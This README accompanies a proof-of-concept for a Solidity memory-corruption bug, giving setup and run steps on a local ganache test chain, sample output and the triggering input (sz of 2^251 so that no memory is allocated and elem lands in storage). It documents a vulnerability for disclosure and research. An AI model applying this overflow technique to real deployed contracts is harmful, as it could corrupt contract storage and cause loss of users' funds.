# Requirements

* Node

# Setup

Install `ganache-cli`, `solc`, and `web3` via npm, i.e., `npm install ganache-cli web3 solc --save`

# Reproducing

In another terminal window, begin the ganache test client: `./node_modules/.bin/ganache-cli`

Then, in this directory, simply run `node index.js`.

You should see something like the following output

    helogale:MemoryCorruptionPOC jrw$ node index.js
    Done compiling
    eth_accounts
    eth_gasPrice
    eth_sendTransaction
    
      Transaction: 0xa1cdd8191ec531941dfbc98f629bcb372244b558b7baf2437d409184c3500f0c
      Contract created: 0x5508bf775096822f81e4d8f2bdcf8ba48e8a353f
      Gas usage: 196441
      Block Number: 1
      Block Time: Fri Mar 27 2020 16:01:16 GMT-0700 (Pacific Daylight Time)
    
    eth_getTransactionReceipt
    eth_getCode
    Deployed corruptible contract
    calling exploitable target, exploiting for 0x0ED3D44e91764A38b0eC20420f939cE057cF09e7
    eth_sendTransaction
    
      Transaction: 0x32b3a12b2fa874105693e7443a9a235218e75fc341a8da9854189fb66f71dc50
      Gas usage: 45583
      Block Number: 2
      Block Time: Fri Mar 27 2020 16:01:16 GMT-0700 (Pacific Daylight Time)
    
    eth_getTransactionReceipt
    completed corruption, fetching account balance for 0x0ED3D44e91764A38b0eC20420f939cE057cF09e7
    eth_call
    1234567890

index.js deploys the vulnerable contract and then calls `corruptMemory` with `2^251` for `sz` and
`1234567890` for `elem`. Thus 0 bytes are actually allocated. The last line of output shows that `elem` actually gets written into
storage.
